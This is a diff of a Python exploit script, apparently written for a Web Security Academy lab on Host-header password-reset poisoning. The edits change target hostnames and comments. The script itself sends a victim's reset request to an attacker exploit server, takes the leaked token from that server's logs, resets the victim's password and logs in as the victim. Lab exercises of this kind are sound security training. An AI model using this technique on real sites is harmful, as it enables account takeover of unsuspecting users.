@@ -8,9 +8,9 @@ import re
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # The host that to substitute inside the request
-EVIL_HOST = "exploit-0a81007f03e861bb806216e601300029.exploit-server.net"
+EVIL_HOST = "exploit-0a45009a04f3bd0a8050521f01d50036.exploit-server.net"
 # URL 
-URL = "https://0add00e2038761b780d717bd00f40091.web-security-academy.net/"
+URL = "https://0a6d009a0441bda38001535e004a0042.web-security-academy.net/"
 # Evil URL
 EVIL_URL = "https://"+EVIL_HOST+"/"
 # Headers (the Host header will be changed later)
@@ -30,7 +30,6 @@ def get_csrf_token(URL, session):
 session = requests.Session()
 
 # 1) 
-# New csrf token.
 # Make the prepared POST request using the victim data.
 # Change the Host header.
 # Send the request.
@@ -55,7 +54,6 @@ except Exception as e:
 #time.sleep(10)
 
 # 2)
-# New csrf token.
 # Access to exploit server logs.
 # Find all the logs that contains the temp-forgot-password-token to extarct the string.
 # Ask for the forgot-password page using the token associated to the victim reset password request.
@@ -86,7 +84,6 @@ change_password_data = {
 r_post = session.post(URL+"forgot-password?temp-forgot-password-token="+tokens[-1], headers=HEADERS, data=change_password_data)
 
 # 3)
-# New nd csrf token.
 # Ask for the login page.
 # Provide the NEW victim data.
 print("Try to log in...")
@@ -101,11 +98,12 @@ victim_data = {
 
 r_post = session.post(URL+"login", headers=HEADERS, data=victim_data)
 
-if "Log out" in r_post.text or "My account" in r_post.text:
+# If it is possible to log out the attacker must be inside the victim account.
+if "Log out" in r_post.text:
     print(f"Successful exploit. Password changed in: {PASSWORD}")
+    print(f"Lab solved.")
 else:
     print("Failed.")
-
 
 
 
